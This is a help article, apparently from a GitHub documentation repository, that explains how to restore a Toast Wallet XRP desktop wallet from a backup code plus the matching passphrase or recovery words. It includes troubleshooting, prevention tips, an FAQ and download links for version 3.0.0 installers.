<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Restore a Toast Wallet backup</h1>

<p align="center">Bring your accounts back with the backup code and passphrase or words.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Install the [latest Toast Wallet release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), choose Restore an Existing Wallet, then Restore Backup, paste your backup code and confirm with the passphrase or the six recovery words that belonged to that backup. Your accounts come back as they were when the backup was made.

## 👀 You'll see this if

- You have a Toast Wallet backup code written down and need your accounts back.
- Your old computer has broken, been replaced or been reset.
- You reinstalled the program and now see a welcome screen instead of your accounts.
- Someone told you that your backup code is "useless" and you want to know the truth.

## 🤔 Why it matters

The backup code is an encrypted package of your Toast Wallet: your accounts, your keys and the settings that protect them. On its own it is unreadable, which is what keeps it safe. To open it, Toast Wallet needs a second piece: the passphrase or the six recovery words that were active when the backup was created. Together, those two pieces rebuild your wallet on any computer.

Most failed restores come from mixing generations. People pair a backup from one year with a passphrase they set later, or they try the six words without the backup code. Knowing that a backup is a snapshot of one moment explains almost every error message you might see.

## 🧭 Before you start

Gather everything you have: every backup code you ever wrote down, any passphrases you remember using and the six recovery words if you kept them. Arrange the backups by date if you can. Work on a computer you trust, with no remote-access software running, and with nobody watching your screen.

## 🛠️ Fix: restore step by step

1. **Install the latest desktop wallet.** Download the file for your computer from the official release and check its checksum. The guide [install Toast Wallet on Windows](https://github.com/Toast-Wallet/learn/blob/main/how-to/install-toast-wallet-on-windows.md) covers the most common case. If an old version is installed, remove it first.
2. **Open Toast Wallet.** On the first screen, choose Restore an Existing Wallet.
3. **Choose Restore Backup.** This is the option for your backup code.
4. **Enter the backup code.** Type or paste it exactly. Watch for characters that look alike, such as `0` and `O` or `l` and `1`. A single wrong character makes the code unreadable.
5. **Confirm with the matching secret.** Enter the passphrase that was in place when this backup was made, or the six recovery words from that time. The guide [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) describes how the pieces fit.
6. **Set a PIN.** Choose a PIN for daily use on this computer.
7. **Check your accounts.** Compare the addresses beginning with `r` with any notes you have. Balances load from the XRP Ledger, which can take a moment.
8. **Make a fresh backup.** In Settings, choose Backup Wallet and write down the new code. From now on, use this one.

## 🔁 If that did not work

- **The passphrase is refused.** Try the passphrase you used at the time of the backup, not your current one. See [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md) for a list of common causes.
- **The backup code is rejected.** Re-type it slowly. Compare it in small groups of characters against your paper copy.
- **Some accounts are missing.** An account added after the backup was made will not be in it. Read [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md).
- **You only have the six words.** They are not enough on their own; see [Toast Wallet six words are not a seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-six-words-not-a-seed.md).

## 🛡️ Prevention

Make a new backup code every time you add an account or change your passphrase, and write the date on it. Store each backup code together with the passphrase or the six words that open it, in a safe place, with a second copy elsewhere. Once a year, practise a restore on a spare computer or after a reinstall, so you know it works before you ever need it.

## 📝 Good to know

Restoring does not move or touch your XRP. Your balance has always been on the XRP Ledger; the restore simply gives this copy of Toast Wallet the keys to show and use it. That is also why you can restore the same backup on more than one computer. It is generally best to keep your wallet on one main computer, though, so you always know where it is and which copy holds your newest accounts.

If you find several backup codes from different years, try the newest first. If it opens but some accounts are missing, try older ones too and note which accounts each contains. Once you can see everything, make one new backup that covers all accounts and retire the older sheets carefully, labelling them clearly so they are never confused with the current backup.

## 🔍 A closer look at typing the code

Long codes are easy to mistype. A practical method is to read the code aloud in groups of four characters while a second person, or your own finger on the paper, follows along. If the restore fails, do not retype everything at once; check the first group, then the next, until you find the difference. Patience here avoids most failed restores.

## ❓ FAQ

<details>
<summary>Will restoring move my XRP?</summary>

No. Restoring gives this computer access to your accounts. Your XRP stays where it is on the XRP Ledger.

</details>

<details>
<summary>Can I restore on a Mac a backup made on Windows?</summary>

Yes. Backup codes work across Windows, macOS and Linux with the latest version.

</details>

<details>
<summary>Is there an online restore service?</summary>

No. Any website offering to restore a Toast Wallet is a scam. Restoring happens only inside the desktop app.

</details>

> [!WARNING]
> Never type your backup code, passphrase or words into a website, and never send them to anyone. Restore only inside the Toast Wallet desktop app.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) | Why the encrypted backup code is the real key to restoring. |
| [Toast Wallet passphrase not working](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-passphrase-not-working.md) | Common typing and backup-age reasons a passphrase is refused. |
| [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md) | Why some accounts do not appear and how to bring them back. |
| [Restore Toast Wallet on a new computer](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-on-new-computer.md) | Install the latest version and restore your backup on fresh hardware. |
